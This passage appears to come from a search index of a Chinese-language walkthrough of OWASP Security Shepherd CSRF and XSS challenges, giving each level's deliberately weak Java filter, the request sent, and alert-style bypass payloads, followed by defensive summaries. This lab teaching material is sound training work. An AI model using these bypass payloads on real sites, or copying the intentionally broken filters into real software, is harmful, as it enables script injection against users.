falseId); //\u6838\u5fc3\u9a8c\u8bc1\u64cd\u4f5c if(validLessonAttack) // FindXSS.findCsrfAttackUrl public static boolean findCsrfAttackUrl (String theUrl, String csrfAttackPath, String userIdParameterName, String userIdParameterValue ) { boolean validAttack = false; try { URL theAttack = new URL(theUrl); log.debug(\"csrfAttackPath: \" + csrfAttackPath); log.debug(\"theAttack Host: \" + theAttack.getHost()); log.debug(\"theAttack Port: \" + theAttack.getPort()); log.debug(\"theAttack Path: \" + theAttack.getPath()); log.debug(\"theAttack Query: \" + theAttack.getQuery()); boolean validPath = theAttack.getPath().toLowerCase().endsWith(csrfAttackPath.toLowerCase()); // \u5224\u65ad\u63d0\u4ea4\u7684URL\u662f\u5426\u6b63\u786e if(!validPath) log.debug(\"Invalid Solution: Bad Path submitted. Expected:\" + csrfAttackPath.toLowerCase()); else { boolean validQuery = theAttack.getQuery().toLowerCase().equalsIgnoreCase((userIdParameterName + \"=\" + userIdParameterValue).toLowerCase()); // \u5224\u65ad\u53c2\u6570\u662f\u5426\u6b63\u786e if(!validQuery) log.debug(\"Invalid Solution: Bad Query. Expected: \" + (userIdParameterName + \"=\" + userIdParameterValue).toLowerCase()); else { validAttack = true; } } } catch(MalformedURLException e) { log.debug(\"Invalid URL Submitted: \" + e.toString()); validAttack = false; } catch(Exception e) { log.error(\"FindCSRF Failed: \" + e.toString()); validAttack = false; } return validAttack; }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Cross-Site-Request-Forgery.html#_3","text":"\u8fd9\u4e2a\u53ea\u662f\u4e00\u4e2a\u6a21\u62dfcsrf\u64cd\u4f5c\uff0c\u56e0\u6b64\u76f4\u63a5\u8f93\u5165\u9898\u76ee\u8981\u6c42\u7684 url\u5730\u5740\u5373\u53ef","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Cross-Site-Request-Forgery.html#_4","text":"CSRF\u662f\u4e00\u7c7b\u6bd4\u8f83\u5e38\u89c1\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u6838\u5fc3\u70b9\u662f\u501f\u7528\u53d7\u5bb3\u8005\u7684cookie,\u8fbe\u5230\u7ed5\u8fc7\u7cfb\u7edf\u6743\u9650\u6821\u9a8c \u5177\u4f53\u5371\u5bb3\u53d6\u51b3\u6f0f\u6d1e\u9875\u9762\u5b9e\u73b0\u7684\u529f\u80fd\uff0c\u5982\u4fee\u6539\u7ba1\u7406\u5458\u5bc6\u7801\u529f\u80fd \u5e38\u89c1\u7684\u89e3\u51b3\u65b9\u6848: - \u6821\u9a8c\u8bf7\u6c42\u7684refer \u662f\u5426\u662f\u672c\u57df - \u6bcf\u4e2a\u8bf7\u6c42\u6dfb\u52a0\u968f\u673atoken","title":"\u603b\u7ed3"},{"location":"vul/Cross-Site-Scripting-3.html","text":"Cross Site Scripting 3(\u8de8\u7ad9\u811a\u672c (XSS)3) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u662f\u4e00\u4e2axss\u6ce8\u5165\u70b9\uff0c\u5e76\u4e14\u8fdb\u884c\u4e86\u4e00\u4e9b\u8fc7\u6ee4 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/ad2628bcc79bf10dd54ee62de148ab44b7bd028009a908ce3f1b4d019886d0e HTTP/1.1 searchTerm=dddd&csrfToken=12870305622844378894711308558778749381 \u5728\u4e0a\u4e00\u7ea7\u6311\u6218\u57fa\u7840\u4e0a\u589e\u52a0\u4e86\u4e00\u5c42\u8fc7\u6ee4 XssFilter.levelThree if(Validate.validateTokens(tokenCookie, tokenParmeter)) { String searchTerm = request.getParameter(\"searchTerm\"); log.debug(\"User Submitted - \" + searchTerm); searchTerm = XssFilter.levelThree(searchTerm); log.debug(\"After Filtering - \" + searchTerm); String htmlOutput = new String(); if(FindXSS.search(searchTerm)) { htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"result.wellDone\") + \"</h2>\" + \"<p>\" + bundle.getString(\"result.youDidIt\") + \"<br />\" + bundle.getString(\"result.resultKey\") + \" <a>\" + Hash.generateUserSolution( Getter.getModuleResultFromHash(getServletContext().getRealPath(\"\"), levelHash ), (String)ses.getAttribute(\"userName\") ) + \"</a>\"; } \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801 public static String levelThree (String input) { log.debug(\"Filtering input at XSS levelThree\"); input = input.toLowerCase(); input = input.replaceAll(\"script\", \"scr.pt\"); for(int h = 0; h < FindXSS.javascriptTriggers.length; h++) { for(int i = 0; i <= 3; i++) //\u4e00\u5171\u66ff\u63624\u6b21 input = input.replaceAll(FindXSS.javascriptTriggers[h], \"\"); //\u66ff\u6362\u4e3a\u7a7a } return screwHtmlEncodings(input); } private static String screwHtmlEncodings(String input) { input = input.replaceAll(\"&\", \"!\").replaceAll(\":\", \"!\"); return input; } \u4ece\u9012\u5f52\u5b9e\u73b0\u770b\uff0c\u53ea\u4f1a\u66ff\u63624\u6b21 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u63d0\u4f9b5\u6b21\u653b\u51fb\u4ee3\u7801\u5373\u53ef <input type=\"button\" oncliconcliconcliconcliconclickkkkk=\"alert('XSS')\"/> \u603b\u7ed3 \u00b6 \u4e0d\u5b89\u5168\u7684\u8fc7\u6ee4\u65b9\u5f0f\u975e\u5e38\u5371\u9669\uff0c\u5c3d\u53ef\u80fd\u4e0d\u8981\u51c0\u5316\u7528\u6237\u8f93\u5165\uff0c\u5f53\u68c0\u6d4b\u5230\u5f02\u5e38\u65f6\uff0c\u76f4\u63a5\u62d2\u7edd\u8bf7\u6c42\u53ef\u80fd\u4f1a\u66f4\u5b89\u5168","title":"Cross Site Scripting 3(\u8de8\u7ad9\u811a\u672c (XSS)3)"},{"location":"vul/Cross-Site-Scripting-3.html#cross-site-scripting-3-xss3","text":"","title":"Cross Site Scripting 3(\u8de8\u7ad9\u811a\u672c (XSS)3)"},{"location":"vul/Cross-Site-Scripting-3.html#_1","text":"\u662f\u4e00\u4e2axss\u6ce8\u5165\u70b9\uff0c\u5e76\u4e14\u8fdb\u884c\u4e86\u4e00\u4e9b\u8fc7\u6ee4","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Cross-Site-Scripting-3.html#_2","text":"\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/ad2628bcc79bf10dd54ee62de148ab44b7bd028009a908ce3f1b4d019886d0e HTTP/1.1 searchTerm=dddd&csrfToken=12870305622844378894711308558778749381 \u5728\u4e0a\u4e00\u7ea7\u6311\u6218\u57fa\u7840\u4e0a\u589e\u52a0\u4e86\u4e00\u5c42\u8fc7\u6ee4 XssFilter.levelThree if(Validate.validateTokens(tokenCookie, tokenParmeter)) { String searchTerm = request.getParameter(\"searchTerm\"); log.debug(\"User Submitted - \" + searchTerm); searchTerm = XssFilter.levelThree(searchTerm); log.debug(\"After Filtering - \" + searchTerm); String htmlOutput = new String(); if(FindXSS.search(searchTerm)) { htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"result.wellDone\") + \"</h2>\" + \"<p>\" + bundle.getString(\"result.youDidIt\") + \"<br />\" + bundle.getString(\"result.resultKey\") + \" <a>\" + Hash.generateUserSolution( Getter.getModuleResultFromHash(getServletContext().getRealPath(\"\"), levelHash ), (String)ses.getAttribute(\"userName\") ) + \"</a>\"; } \u5bf9\u5e94\u5b9e\u73b0\u4ee3\u7801 public static String levelThree (String input) { log.debug(\"Filtering input at XSS levelThree\"); input = input.toLowerCase(); input = input.replaceAll(\"script\", \"scr.pt\"); for(int h = 0; h < FindXSS.javascriptTriggers.length; h++) { for(int i = 0; i <= 3; i++) //\u4e00\u5171\u66ff\u63624\u6b21 input = input.replaceAll(FindXSS.javascriptTriggers[h], \"\"); //\u66ff\u6362\u4e3a\u7a7a } return screwHtmlEncodings(input); } private static String screwHtmlEncodings(String input) { input = input.replaceAll(\"&\", \"!\").replaceAll(\":\", \"!\"); return input; } \u4ece\u9012\u5f52\u5b9e\u73b0\u770b\uff0c\u53ea\u4f1a\u66ff\u63624\u6b21","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Cross-Site-Scripting-3.html#_3","text":"\u63d0\u4f9b5\u6b21\u653b\u51fb\u4ee3\u7801\u5373\u53ef <input type=\"button\" oncliconcliconcliconcliconclickkkkk=\"alert('XSS')\"/>","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Cross-Site-Scripting-3.html#_4","text":"\u4e0d\u5b89\u5168\u7684\u8fc7\u6ee4\u65b9\u5f0f\u975e\u5e38\u5371\u9669\uff0c\u5c3d\u53ef\u80fd\u4e0d\u8981\u51c0\u5316\u7528\u6237\u8f93\u5165\uff0c\u5f53\u68c0\u6d4b\u5230\u5f02\u5e38\u65f6\uff0c\u76f4\u63a5\u62d2\u7edd\u8bf7\u6c42\u53ef\u80fd\u4f1a\u66f4\u5b89\u5168","title":"\u603b\u7ed3"},{"location":"vul/Cross-Site-Scripting-4.html","text":"Cross Site Scripting 4(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 4) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u5229\u7528xss\u6ce8\u5165\u70b9\uff0c\u5b9e\u73b0\u4e00\u4e2a\u5f39\u6846 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/06f81ca93f26236112f8e31f32939bd496ffe8c9f7b564bce32bd5e3a8c2f751 HTTP/1.1 searchTerm=http%3A%2F%2Ftest%22oNmouseover%3Dalert(123)%3B%2F%2F&csrfToken=-32864054630884368385257168535939963911 \u5bf9\u5e94\u8bf7\u6c42\u5305 String searchTerm = request.getParameter(\"searchTerm\"); log.debug(\"User Submitted - \" + searchTerm); if(!searchTerm.startsWith(\"http\")) { searchTerm = \"https://www.owasp.org/index.php/OWASP_Security_Shepherd\"; userPost = \"<a href=\\\"\" + searchTerm + \"\\\" alt=\\\"OWASP Security Shepherd\\\">\" + searchTerm + \"</a>\"; } else { searchTerm = XssFilter.encodeForHtml(searchTerm); userPost = \"<a href=\\\"\" + searchTerm + \"\\\" alt=\\\"\" + searchTerm + \"\\\">\" + searchTerm + \"</a>\"; log.debug(\"After Encoding - \" + searchTerm); if(FindXSS.search(userPost)) { htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"result.wellDone\") + \"</h2>\" + \"<p>\" + bundle.getString(\"result.youDidIt\") + \"<br />\" + bundle.getString(\"result.resultKey\") + \" <a>\" + Hash.generateUserSolution( Getter.getModuleResultFromHash(getServletContext().getRealPath(\"\"), levelHash), (String)ses.getAttribute(\"userName\") ) + \"</a>\"; } } # \u5bf9\u5e94\u8fdb\u884c\u7f16\u7801 public static String XssFilter.encodeForHtml (String input) { log.debug(\"Filtering input at XSS white list\"); input = Encode.forHtml(input); //Decode quotes to open a security hole in Encoder input = input.replaceFirst(\"&#34;\", \"\\\"\"); //Encode lower-case \"on\" and upper-case \"on\" to complicate the required attack vectors to pass return input.replaceAll(\"on\", \"&#x6f;&#x6e;\").replaceAll(\"ON\", \"&#x4f;&#x4e;\"); } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u6700\u7ec8\u7b54\u6848 http://test\"oNmouseover=alert(123);// \u603b\u7ed3 \u00b6 \u8f93\u5165\u9a8c\u8bc1 \u7684\u4e0d\u5b8c\u5168","title":"Cross Site Scripting 4(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 4)"},{"location":"vul/Cross-Site-Scripting-4.html#cross-site-scripting-4-4","text":"","title":"Cross Site Scripting 4(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 4)"},{"location":"vul/Cross-Site-Scripting-4.html#_1","text":"\u5229\u7528xss\u6ce8\u5165\u70b9\uff0c\u5b9e\u73b0\u4e00\u4e2a\u5f39\u6846","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Cross-Site-Scripting-4.html#_2","text":"\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/06f81ca93f26236112f8e31f32939bd496ffe8c9f7b564bce32bd5e3a8c2f751 HTTP/1.1 searchTerm=http%3A%2F%2Ftest%22oNmouseover%3Dalert(123)%3B%2F%2F&csrfToken=-32864054630884368385257168535939963911 \u5bf9\u5e94\u8bf7\u6c42\u5305 String searchTerm = request.getParameter(\"searchTerm\"); log.debug(\"User Submitted - \" + searchTerm); if(!searchTerm.startsWith(\"http\")) { searchTerm = \"https://www.owasp.org/index.php/OWASP_Security_Shepherd\"; userPost = \"<a href=\\\"\" + searchTerm + \"\\\" alt=\\\"OWASP Security Shepherd\\\">\" + searchTerm + \"</a>\"; } else { searchTerm = XssFilter.encodeForHtml(searchTerm); userPost = \"<a href=\\\"\" + searchTerm + \"\\\" alt=\\\"\" + searchTerm + \"\\\">\" + searchTerm + \"</a>\"; log.debug(\"After Encoding - \" + searchTerm); if(FindXSS.search(userPost)) { htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"result.wellDone\") + \"</h2>\" + \"<p>\" + bundle.getString(\"result.youDidIt\") + \"<br />\" + bundle.getString(\"result.resultKey\") + \" <a>\" + Hash.generateUserSolution( Getter.getModuleResultFromHash(getServletContext().getRealPath(\"\"), levelHash), (String)ses.getAttribute(\"userName\") ) + \"</a>\"; } } # \u5bf9\u5e94\u8fdb\u884c\u7f16\u7801 public static String XssFilter.encodeForHtml (String input) { log.debug(\"Filtering input at XSS white list\"); input = Encode.forHtml(input); //Decode quotes to open a security hole in Encoder input = input.replaceFirst(\"&#34;\", \"\\\"\"); //Encode lower-case \"on\" and upper-case \"on\" to complicate the required attack vectors to pass return input.replaceAll(\"on\", \"&#x6f;&#x6e;\").replaceAll(\"ON\", \"&#x4f;&#x4e;\"); }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Cross-Site-Scripting-4.html#_3","text":"\u6700\u7ec8\u7b54\u6848 http://test\"oNmouseover=alert(123);//","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Cross-Site-Scripting-4.html#_4","text":"\u8f93\u5165\u9a8c\u8bc1 \u7684\u4e0d\u5b8c\u5168","title":"\u603b\u7ed3"},{"location":"vul/Cross-Site-Scripting-5.html","text":"Cross Site Scripting 5(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 5) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u5728xss\u6ce8\u5165\u70b9\u8f93\u5165javascript,\u6267\u884c\u4e00\u4e2aalert\u5f39\u6846 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/f37d45f597832cdc6e91358dca3f53039d4489c94df2ee280d6203b389dd5671 HTTP/1.1 searchTerm=http%3A%2F%2Ftest%22%22+onciclk%3Dalert(1)%2F%2F&csrfToken=139493510921427323986105593611916916558 \u5bf9\u5e94\u529f\u80fd\u4ee3\u7801 String htmlOutput = new String(); String userPost = new String(); String searchTerm = request.getParameter(\"searchTerm\"); //\u8bf7\u6c42\u7684\u53c2\u6570 log.debug(\"User Submitted - \" + searchTerm); searchTerm = XssFilter.badUrlValidate(searchTerm); //\u8fdb\u884c\u8fc7\u6ee4 userPost = \"<a href=\\\"\" + searchTerm + \"\\\">Your HTTP Link!</a>\"; //\u8fd4\u56de\u5230\u524d\u7aef\u7684 html\u4ee3\u7801 log.debug(\"After WhiteListing - \" + searchTerm); boolean xssDetected = FindXSS.search(userPost); if(xssDetected) { htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"result.wellDone\") + \"</h2>\" + \"<p>\" + bundle.getString(\"result.youDidIt\") + \"<br />\" + bundle.getString(\"result.resultKey\") + \" <a>\" + Hash.generateUserSolution( Getter.getModuleResultFromHash(getServletContext().getRealPath(\"\"), levelHash), (String)ses.getAttribute(\"userName\") ) + \"</a>\"; } public static String XssFilter.badUrlValidate (String input) { String howToMakeAUrlUrl = new String(\"https://www.google.com/search?q=What+does+a+HTTP+link+look+like\"); input = input.toLowerCase(); if (input.startsWith(\"http\")) { try { //\u5bf9\u53cc\u5f15\u53f7\u8fdb\u884c\u4e86\u8f6c\u4e49 \u4f46\u53ea\u8f6c\u4e49\u4e86\u4e00\u4e2a\u53cc\u5f15\u53f7 URL theUrl = new URL(input.replaceAll(\"#\", \"&#x23;\").replaceAll(\"<\", \"&#x3c;\").replaceAll(\">\", \"&#x3e;\").replaceFirst(\"\\\"\", \"&quot;\")); input = theUrl.toString(); } catch (MalformedURLException e) { log.debug(\"Could not Cast URL from input: \" + e.toString()); input = howToMakeAUrlUrl; } } else { log.debug(\"Was not a HTTP URL\"); input = howToMakeAUrlUrl; } return input; } \u89e3\u9898\u6b65\u9aa4 \u00b6 \u4ece\u4ee3\u7801\u770b\uff0c\u8fd4\u56de\u5230\u524d\u7aef\u662f\u4e00\u4e2ahtml a\u6807\u7b7e\u7684 \u94fe\u63a5\u5b58\u5728\u6ce8\u5165\uff0c\u6240\u4ee5\u5fc5\u987b \u8f93\u5165\u4e00\u4e2a\u53cc\u5f15\u53f7\u95ed\u5408\u524d\u9762\u7684\u53cc\u5f15\u53f7\uff0c\u624d\u80fd\u6b63\u786e\u6267\u884c\uff0c\u540c\u65f6\u8fc7\u6ee4\u65f6\u4f7f\u7528\u7684 replaceFirst \u51fd\u6570\uff0c\u53ea\u4f1a\u8fc7\u6ee4\u7b2c\u4e00\u4e2a\u53cc\u5f15\u53f7 \uff0c\u56e0\u6b64\u8f93\u5165\u4e24\u4e2a\u53cc\u5f15\u53f7\u5373\u53ef http://test\"\" onclick=alert(1)// \u603b\u7ed3 \u00b6 \u8fc7\u6ee4\u8981\u4e25\u683c,\u5426\u5219\u5c31\u4f1a\u5bfc\u81f4\u5b89\u5168\u95ee\u9898","title":"Cross Site Scripting 5(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 5)"},{"location":"vul/Cross-Site-Scripting-5.html#cross-site-scripting-5-5","text":"","title":"Cross Site Scripting 5(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 5)"},{"location":"vul/Cross-Site-Scripting-5.html#_1","text":"\u5728xss\u6ce8\u5165\u70b9\u8f93\u5165javascript,\u6267\u884c\u4e00\u4e2aalert\u5f39\u6846","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Cross-Site-Scripting-5.html#_2","text":"\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/f37d45f597832cdc6e91358dca3f53039d4489c94df2ee280d6203b389dd5671 HTTP/1.1 searchTerm=http%3A%2F%2Ftest%22%22+onciclk%3Dalert(1)%2F%2F&csrfToken=139493510921427323986105593611916916558 \u5bf9\u5e94\u529f\u80fd\u4ee3\u7801 String htmlOutput = new String(); String userPost = new String(); String searchTerm = request.getParameter(\"searchTerm\"); //\u8bf7\u6c42\u7684\u53c2\u6570 log.debug(\"User Submitted - \" + searchTerm); searchTerm = XssFilter.badUrlValidate(searchTerm); //\u8fdb\u884c\u8fc7\u6ee4 userPost = \"<a href=\\\"\" + searchTerm + \"\\\">Your HTTP Link!</a>\"; //\u8fd4\u56de\u5230\u524d\u7aef\u7684 html\u4ee3\u7801 log.debug(\"After WhiteListing - \" + searchTerm); boolean xssDetected = FindXSS.search(userPost); if(xssDetected) { htmlOutput = \"<h2 class='title'>\" + bundle.getString(\"result.wellDone\") + \"</h2>\" + \"<p>\" + bundle.getString(\"result.youDidIt\") + \"<br />\" + bundle.getString(\"result.resultKey\") + \" <a>\" + Hash.generateUserSolution( Getter.getModuleResultFromHash(getServletContext().getRealPath(\"\"), levelHash), (String)ses.getAttribute(\"userName\") ) + \"</a>\"; } public static String XssFilter.badUrlValidate (String input) { String howToMakeAUrlUrl = new String(\"https://www.google.com/search?q=What+does+a+HTTP+link+look+like\"); input = input.toLowerCase(); if (input.startsWith(\"http\")) { try { //\u5bf9\u53cc\u5f15\u53f7\u8fdb\u884c\u4e86\u8f6c\u4e49 \u4f46\u53ea\u8f6c\u4e49\u4e86\u4e00\u4e2a\u53cc\u5f15\u53f7 URL theUrl = new URL(input.replaceAll(\"#\", \"&#x23;\").replaceAll(\"<\", \"&#x3c;\").replaceAll(\">\", \"&#x3e;\").replaceFirst(\"\\\"\", \"&quot;\")); input = theUrl.toString(); } catch (MalformedURLException e) { log.debug(\"Could not Cast URL from input: \" + e.toString()); input = howToMakeAUrlUrl; } } else { log.debug(\"Was not a HTTP URL\"); input = howToMakeAUrlUrl; } return input; }","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Cross-Site-Scripting-5.html#_3","text":"\u4ece\u4ee3\u7801\u770b\uff0c\u8fd4\u56de\u5230\u524d\u7aef\u662f\u4e00\u4e2ahtml a\u6807\u7b7e\u7684 \u94fe\u63a5\u5b58\u5728\u6ce8\u5165\uff0c\u6240\u4ee5\u5fc5\u987b \u8f93\u5165\u4e00\u4e2a\u53cc\u5f15\u53f7\u95ed\u5408\u524d\u9762\u7684\u53cc\u5f15\u53f7\uff0c\u624d\u80fd\u6b63\u786e\u6267\u884c\uff0c\u540c\u65f6\u8fc7\u6ee4\u65f6\u4f7f\u7528\u7684 replaceFirst \u51fd\u6570\uff0c\u53ea\u4f1a\u8fc7\u6ee4\u7b2c\u4e00\u4e2a\u53cc\u5f15\u53f7 \uff0c\u56e0\u6b64\u8f93\u5165\u4e24\u4e2a\u53cc\u5f15\u53f7\u5373\u53ef http://test\"\" onclick=alert(1)//","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Cross-Site-Scripting-5.html#_4","text":"\u8fc7\u6ee4\u8981\u4e25\u683c,\u5426\u5219\u5c31\u4f1a\u5bfc\u81f4\u5b89\u5168\u95ee\u9898","title":"\u603b\u7ed3"},{"location":"vul/Cross-Site-Scripting-One.html","text":"Cross Site Scripting One(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 1) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9875\u9762\u8f93\u5165\u6846\u5df2\u7ecf\u5bf9\u8f93\u5165\u8fdb\u884c\u4e86\u4e00\u4e9b\u8fc7\u6ee4\uff0c\u9700\u8981\u5229\u7528\u8f93\u5165\u6846\u63d0\u4ea4\u4e00\u4e2a\u53ef\u4ee5\u6267\u884calert\u7684\u4ee3\u7801 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u70b9\u51fb\u9875\u9762 \u83b7\u5f97\u8be5\u7528\u6237 \u6309\u94ae POST /challenges/d72ca2694422af2e6b3c5d90e4c11e7b4575a7bc12ee6d0a384ac2469449e8fa HTTP/1.1 searchTerm=%3CIMG+SRC%3D%22%23%22+ONERROR%3D%22alert('XSS')%22%2F%3E&csrfToken=-127827516577406622538923948450307535312 \u540e\u7aef\u5b9e\u73b0\u4ee3\u7801 src/main/java/servlets/module/challenge/XssChallengeOne.java String searchTerm = request.getParameter(\"searchTerm\"); log.debug(\"User Submitted - \" + searchTerm); searchTerm = XssFilter.levelOne(searchTerm); log.debug(\"After Filtering - \" + searchTerm); String htmlOutput = new String(); if(FindXSS.search(searchTerm)) \u5728\u4e00\u4e2a\u9898\u57fa\u7840\u4e0a\u589e\u52a0\u4e86\u4e00\u4e2a XssFilter.levelOne(searchTerm); \u8fc7\u6ee4\u529f\u80fd public static String levelOne (String input) { log.debug(\"Filtering input at XSS levelOne\"); return input.toLowerCase().replaceAll(\"script\", \"scr.pt\").replaceAll(\"SCRIPT\", \"SCR.PT\"); } \u5c06script\u53d8\u6210\u4e86 scr.pt \u5bfc\u81f4\u65e0\u6cd5\u6267\u884c \u89e3\u9898\u6b65\u9aa4 \u00b6 \u76f4\u63a5\u5728\u8f93\u5165\u6846\u4e2d\u8f93\u5165 \u5373\u53ef <IMG SRC=\"#\" ONERROR=\"alert('XSS')\"/> \u603b\u7ed3 \u00b6 \u5982\u4e0a\u9898\u6240\u8ff0\uff0c\u89e3\u51b3xss\u95ee\u9898\u662f\u4e2a\u590d\u6742\u7684\u8fc7\u7a0b\uff0c\u672c\u9898\u4ec5\u662f\u7981\u6b62\u8f93\u5165script\u6807\u7b7e\uff0c\u6240\u4ee5\u5f88\u5bb9\u6613\u88ab\u653b\u51fb\u8005\u7ed5\u8fc7 \u5982\u679c\u60a8\u7684\u7cfb\u7edf\u6ca1\u6709\u5bcc\u6587\u672c(\u5305\u542b\u6807\u7b7e\u7684\u7528\u6237\u63d0\u4ea4\uff0c\u5982<a \u7b49),\u53ef\u4ee5\u76f4\u63a5\u91c7\u7528\u7f16\u7801\u8f93\u51fa\u7684\u65b9\u6cd5\uff0c\u5c06<, > \u7b49\u8fdb\u884c\u7f16\u7801\u8f93\u51fa \u5982\u679c\u60a8\u7684\u7cfb\u7edf\u9700\u8981\u5bcc\u6587\u672c\uff0c\u5219\u53ea\u80fd\u5728\u63a5\u6536\u5230\u7528\u6237\u63d0\u4ea4\u5185\u5bb9\u65f6\u8fdb\u884c\u767d\u540d\u5355\u6807\u7b7e\u6821\u9a8c \u8fd9\u7c7b\u653b\u51fb\u7684\u9632\u5fa1\u662f\u975e\u5e38\u590d\u6742\u7684\uff0c\u539f\u56e0\u662f\u524d\u7aef\u9875\u9762\u7684\u8f93\u51fa\u70b9\u592a\u591a\uff0c\u5982html\u3001javascript\u3001css\u7b49\u7b49\uff0c\u6709\u4e9b\u8f93\u5165\u70b9\u5b8c\u5168\u4e0d\u9700\u8981\u4efb\u4f55\u7279\u6b8a\u5b57\u7b26\uff0c\u56e0\u6b64\u5728\u505a\u597d\u57fa\u7840\u9632\u5fa1(\u8f93\u5165\u4e0e\u9a8c\u8bc1\u548c\u7f16\u7801\u8f93\u51fa)\u57fa\u7840\u4e0a\uff0c\u4e5f\u8981\u9488\u5bf9\u7279\u5b9a\u573a\u666f\u8fdb\u884c\u7279\u6b8a\u9a8c\u8bc1","title":"Cross Site Scripting One(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 1)"},{"location":"vul/Cross-Site-Scripting-One.html#cross-site-scripting-one-1","text":"","title":"Cross Site Scripting One(\u8de8\u7ad9\u811a\u672c\u653b\u51fb 1)"},{"location":"vul/Cross-Site-Scripting-One.html#_1","text":"\u9875\u9762\u8f93\u5165\u6846\u5df2\u7ecf\u5bf9\u8f93\u5165\u8fdb\u884c\u4e86\u4e00\u4e9b\u8fc7\u6ee4\uff0c\u9700\u8981\u5229\u7528\u8f93\u5165\u6846\u63d0\u4ea4\u4e00\u4e2a\u53ef\u4ee5\u6267\u884calert\u7684\u4ee3\u7801","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Cross-Site-Scripting-One.html#_2","text":"\u70b9\u51fb\u9875\u9762 \u83b7\u5f97\u8be5\u7528\u6237 \u6309\u94ae POST /challenges/d72ca2694422af2e6b3c5d90e4c11e7b4575a7bc12ee6d0a384ac2469449e8fa HTTP/1.1 searchTerm=%3CIMG+SRC%3D%22%23%22+ONERROR%3D%22alert('XSS')%22%2F%3E&csrfToken=-127827516577406622538923948450307535312 \u540e\u7aef\u5b9e\u73b0\u4ee3\u7801 src/main/java/servlets/module/challenge/XssChallengeOne.java String searchTerm = request.getParameter(\"searchTerm\"); log.debug(\"User Submitted - \" + searchTerm); searchTerm = XssFilter.levelOne(searchTerm); log.debug(\"After Filtering - \" + searchTerm); String htmlOutput = new String(); if(FindXSS.search(searchTerm)) \u5728\u4e00\u4e2a\u9898\u57fa\u7840\u4e0a\u589e\u52a0\u4e86\u4e00\u4e2a XssFilter.levelOne(searchTerm); \u8fc7\u6ee4\u529f\u80fd public static String levelOne (String input) { log.debug(\"Filtering input at XSS levelOne\"); return input.toLowerCase().replaceAll(\"script\", \"scr.pt\").replaceAll(\"SCRIPT\", \"SCR.PT\"); } \u5c06script\u53d8\u6210\u4e86 scr.pt \u5bfc\u81f4\u65e0\u6cd5\u6267\u884c","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/Cross-Site-Scripting-One.html#_3","text":"\u76f4\u63a5\u5728\u8f93\u5165\u6846\u4e2d\u8f93\u5165 \u5373\u53ef <IMG SRC=\"#\" ONERROR=\"alert('XSS')\"/>","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/Cross-Site-Scripting-One.html#_4","text":"\u5982\u4e0a\u9898\u6240\u8ff0\uff0c\u89e3\u51b3xss\u95ee\u9898\u662f\u4e2a\u590d\u6742\u7684\u8fc7\u7a0b\uff0c\u672c\u9898\u4ec5\u662f\u7981\u6b62\u8f93\u5165script\u6807\u7b7e\uff0c\u6240\u4ee5\u5f88\u5bb9\u6613\u88ab\u653b\u51fb\u8005\u7ed5\u8fc7 \u5982\u679c\u60a8\u7684\u7cfb\u7edf\u6ca1\u6709\u5bcc\u6587\u672c(\u5305\u542b\u6807\u7b7e\u7684\u7528\u6237\u63d0\u4ea4\uff0c\u5982<a \u7b49),\u53ef\u4ee5\u76f4\u63a5\u91c7\u7528\u7f16\u7801\u8f93\u51fa\u7684\u65b9\u6cd5\uff0c\u5c06<, > \u7b49\u8fdb\u884c\u7f16\u7801\u8f93\u51fa \u5982\u679c\u60a8\u7684\u7cfb\u7edf\u9700\u8981\u5bcc\u6587\u672c\uff0c\u5219\u53ea\u80fd\u5728\u63a5\u6536\u5230\u7528\u6237\u63d0\u4ea4\u5185\u5bb9\u65f6\u8fdb\u884c\u767d\u540d\u5355\u6807\u7b7e\u6821\u9a8c 